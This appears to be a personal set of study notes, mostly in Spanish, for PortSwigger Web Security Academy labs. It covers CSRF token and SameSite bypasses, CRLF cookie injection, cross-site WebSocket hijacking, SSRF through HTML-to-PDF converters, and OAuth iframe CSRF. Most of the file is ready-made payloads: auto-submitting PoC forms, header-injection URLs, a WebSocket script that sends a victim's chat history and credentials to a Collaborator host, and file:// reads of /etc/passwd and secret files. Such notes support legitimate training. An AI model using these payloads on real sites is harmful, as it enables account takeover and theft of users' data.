
La falsificaci√≥n de solicitud entre sitios (tambi√©n conocida como CSRF) es una vulnerabilidad de seguridad web que permite a un atacante inducir a los usuarios a realizar acciones que no tienen intenci√≥n de realizar. Permite a un atacante eludir parcialmente la pol√≠tica de mismo origen, que est√° dise√±ada para evitar que diferentes sitios web interfieran entre s√≠.

<hr>

- **Strict üîí ‚Üí Solo dentro del mismo sitio. M√°s seguro, pero puede romper algunas funcionalidades.**
- **Lax üåê ‚Üí Permite cookies en enlaces, pero bloquea en formularios y scripts para evitar ataques CSRF.**
### Payloads 

```js
//LAB: CSRF sin defensas
//POST /my-account/change-email
	//engagement tools>Generate CSRF POC.
	//store & deliver exploit to victim - SERVER-EXPLOIT

//LAB: CSRF validaci√≥n Token Depends of method request (ex:POST->GET)
	//Capture request to change email Change Request method to GET
	//GET /my-account/change-email?email=attacker@evil.net
	//Right click > engagement tools > generate CSRF POC
	//store & deliver exploit to victim

//LAB: CSRF validaci√≥n Token Depends presencia Token (delete param CSRF=)
	//POST /my-account/change-email //(sin el token CSRF)
	//Engagement Tools>Generate CSRF POC.
	//Store & deliver exploit to victim.

//LAB: CSRF no se vincula a session user unico (CSRF's globales sin validar para un unico user cada token) - reutilizacion de token con otros usuarios.
	//Ingresar como carlos y change-email
	//My-account to get Hidden CSRF in dom
	//POST /my-account/change-email //con token CSRF hidden
	//Engagement Tools>Generate CSRF POC & store-deliver exploit to victim
	//y el problema recae en que como user carlos con mi token csrf hidden, puedo
	//hacer que un user Viewr cambie su email con mi mismo token. 

//LAB: CSRF Token vinculado con una cookie que no es la de session.
	//change Session cookie -> logs you out
	//change csrf key -> invalid CSRF token
	//= not linked
	//Change the csrf token and key to the ones of the other account you have (optional, just to confirm) -> observer we can use them
	//Header Injection:
	//Set csrfkey GET /?search=test%0d%0aSet-Cookie:%20csrfKey=5aXHr4eRTwOpjA0WncadN9qOmsDssRcJ%3b%20SameSite=None
	* test
	  Set-Cookie: csrfKey=5aXHr4eRTwOpjA0WncadN9qOmsDssRcJ; SameSite=None
	//adjust CSRF payload,change script for including you csrf token, adn key in the header injection:
	//<img src="https://ID-LAB.web-security-academy.net/?search=%0d%0aSet-Cookie:%20csrfKey=5aXHr4eRTwOpjA0WncadN9qOmsDssRcJ%3b%20SameSite=None" onerror="document.forms[0].submit()">
	//generate CSRF POC: 
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1d00f804cb5dbb84f7d88300c80029.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tester&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="rlZr9DjVtPtZoXIRVQqoqDORNB2oGXxs" />
      <input type="submit" value="Submit request" />
    </form>
		<img src="https://0a1d00f804cb5dbb84f7d88300c80029.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=HiclZEJ4RphgOx3E2pDxRpw8f9I4S2PG%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>


//LAB: CSRF Token Duplicated in Cookie: 
	//?search=coping%0d%0aSet-Cookie:%20csrf=TOKEN%3b%20SameSite=None"
	//Generate CSRF POC: 
	//en este caso la app nombra el csrf de la cookie no como csrfkey=token sino como csrf=token, es importante cambiarlo sino podr√≠a generar un error durante el ataque
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tester2&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="3hLcSGU19e160bjtlVhZPVlEMhDEuC0x" />
      <input type="submit" value="Submit request" />
    </form>
		<img src="https://ID-LAB.web-security-academy.net/?search=coping%0d%0aSet-Cookie:%20csrf=3hLcSGU19e160bjtlVhZPVlEMhDEuC0x%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

//LAB: CSRF Bypass SameSite=Lax anulacion Method:
	* SameSite=Lax
	//GET /my-account/change-email?email=wiener%40normal-user.net&_method=POST
	<script>
    document.location = 'https://ID-LAB.web-security-academy.net/my-account/change-email?email=test%40normal-user.net&_method=POST';
	</script>

//LAB: CSRF Bypass SameSite strict redirection side client: 
	* SameSite=Strict
	//encontramos un redirect en el source js del lab, y se podia meter path traversal
	//GET /post/comment/confirmation?postId=1/../../my-account/change-email?email=test%40normal-user.net
	<script>
document.location = "https://ID-LAB.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=test%40normal-user.net%26submit=1";
	</script>

//LAB: CSWH - SameSite strict bypass via Sibling Domain: 
	//GET /resources/js/chat.js HTTP/2 //contiene un Access-Control-Allow-Origin, con un sibling domain: 
	//https://cms.ID-LAB-web-security-academy.com > tiene un POST /login
	//XSS En param Body: username=<scri..>alert(1)</scri...>&password=...
	<script>
    var ws = new WebSocket('wss://ID-LAB.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://BURP-COLLAB.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
	</script>
	//TODO ESE PAYLOAD encoded a URL en el param body username.
	//Asi podemos exfiltrar el historial y creds del user victim.

//LAB: CSRF SameSite=Lax Bypass via Cookie Refresh
	//Endoint de change-email claro. tal como dice el csrf poc de abajo->
	<html>
	  <!-- CSRF PoC - generated by Burp Suite Professional -->
	  <body>
	    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
	      <input type="hidden" name="email" value="attacker-2000&#64;normal&#45;user&#46;net" />
	    </form>
			 <p>Click Me!</p>
	    <script>
				 window.onclick = () => {
	        	 window.open('https://ID-LAB.web-security-academy.net/social-login')
						 setTimeout(null,3000)
	      }
	      history.pushState('', '', '/');
	      document.forms[0].submit();
	    </script>
	  </body>
	</html>
	//Super important cambiar el *correo* por uno nuevo para que el ataque pueda darse
	//Cuando hagamos clic en alg√∫n lugar de la p√°gina de exploits, abrir√° otra ventana a /social-login, esto asignar√° una nueva cookie de sesi√≥n, que nos permite tener 120 segundos para enviar una solicitud POST para actualizar la direcci√≥n de correo electr√≥nico.

//LAB: CSRF where <meta> Referer validation depends on header being present
* Si el stage 1 del examen no fue un exploit interactivo, seguramente el stage 2 si lo sea, y podemos usar este para tomar acceso administrativo simplemente enviandoselo a la victima admin. ->
	//Algunas apps usan header referer como defensa->CSRF, pero una mierda es.
	* <meta name="referrer" content="never"> //dentro de la tag <body>
	//GENEREATE CSRF POC y dejamos la tag <meta> dentro de <body>
	<html>
	  <!-- CSRF PoC - generated by Burp Suite Professional -->
	  <body>
	    <meta name="referrer" content="never">
	    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
	      <input type="hidden" name="email" value="ATTACKER&#64;normal&#45;user&#46;net" />
	      <input type="submit" value="Submit request" />
	    </form>
	    <script>
	      history.pushState('', '', '/');
	      document.forms[0].submit();
	    </script>
	  </body>
	</html>
	//Super importante cambiar el email, para que el ataque se de.

//LAB: CSRF with broken Referer validation
	//En este caso header Referer no valida el dominio correctamente,
	//solo valida que contenga la palabra correcta del dominio. 
	<html>
	  <!-- CSRF PoC - generated by Burp Suite Professional -->
	  <body>
	    <form action="https://ID-LAB.web-security-academy.net/my-account/change-email" method="POST">
	      <input type="hidden" name="email" value="attacker5&#64;normal&#45;user&#46;net" />
	      <input type="submit" value="Submit request" />
	    </form>
	    <script>
	      history.pushState('', '', '/?ID-LAB.web-security-academy.net');
	      document.forms[0].submit();
	    </script>
	  </body>
	</html>
	//Actualizar el correo claramente. 
	//en server exploit dejamos la regla: `en el HEAD`
	Referrer-Policy: unsafe-url
	//Y listo solved y que coma monda el planea entero. 
```


<hr> 

### LAB: Performing CSRF exploits over GraphQL



### CSRF Is Logged In `POST /refreshPassword`

> If cookie with the **isloggedin** name is _**identified**_, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low privilege user, CSRF where token is not tied to user session.

```html
POST /refreshpassword HTTP/1.1
Host: TARGET.net
Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
Content-Length: 60
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://TARGET.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

csrf=TOKEN&username=administrator
```

![[Pasted image 20250219161347.png]]


### HTML to PDF

> **Identify** a PDF download function and the `source code` uses `JSON.stringify` to create html on download. This HTML-to-PDF framework is vulnerable to SSRF attack. Partial `source code` for JavaScript on the target `downloadReport.js`.

```js
function downloadReport(event, path, param) {

body: JSON.stringify({
  [param]: html
  }
  )
  
```

> **Note:** The `<div>` tag defines a division or a section in an HTML document. The
> 
> tag is used as a container for HTML elements - which is then styled with CSS. [z3nsh3ll explain HTML DIV demarcation and SPAN different ways to style the elements.](https://youtu.be/5djtMMciBlw)

```html
<div><p>Report Heading by <img src="https://OASTIFY.COM/test.png"></p>
```

> Identify file download HTML-to-PDF convert function on target is vulnerable.

```js
<script>
	document.write('<iframe src=file:///etc/passwd></iframe>');
</script>
```

> Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).

[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)

> Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as `wkhtmltopdf` to read local file, resulting in [SSRF to Local File Read Exploit in Hassan's blog](http://hassankhanyusufzai.com/SSRF-to-LFI/).

> Thehackerish showing wkHTMLtoPDF exploitation using [root-me.org - Gemini-Pentest-v1](https://www.root-me.org/) CTF lab in the video [Pentest SSRF Ep4](https://youtu.be/Prqt3N5QU2Q?t=345) by editing the name of the admin profile with HTML content it is then generated server side by including remote or local files.

![[Pasted image 20250219163530.png]]

```html
<html>
 <body>
  <script>
   x = new XMLHttpRequest;
   x.onload = function() {
    document.write(this.responseText)
   };
   x.open("GET", "file:///home/carlos/secret");
   x.send();
  </script>
 </body>
</html>
```

> JSON POST request body containing the HTMLtoPDF formatted payload to read local file.

```json
{
 "tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
}
```

![[Pasted image 20250219163715.png]]

> Above the display name is injected with `HTML` payload and on export the HTML-to-PDF converter perform SSRF.

> The PDF creator: wkhtmltopdf 0.12.5 is known for SSRF vulnerabilities, and in [HackTricks - Server Side XSS - Dynamic PDF](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf) there is cross site scripting and server side exploits documented.

### OAuth - IFRAME CSRF

> oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.

[![csrf](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf.png)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf.png)

> Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. **Drop** the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the `src` attribute points to the URL you just copied.

```html
<iframe src="https://TARGET.net/oauth-linking?code=STOLEN-CODE"></iframe>
```

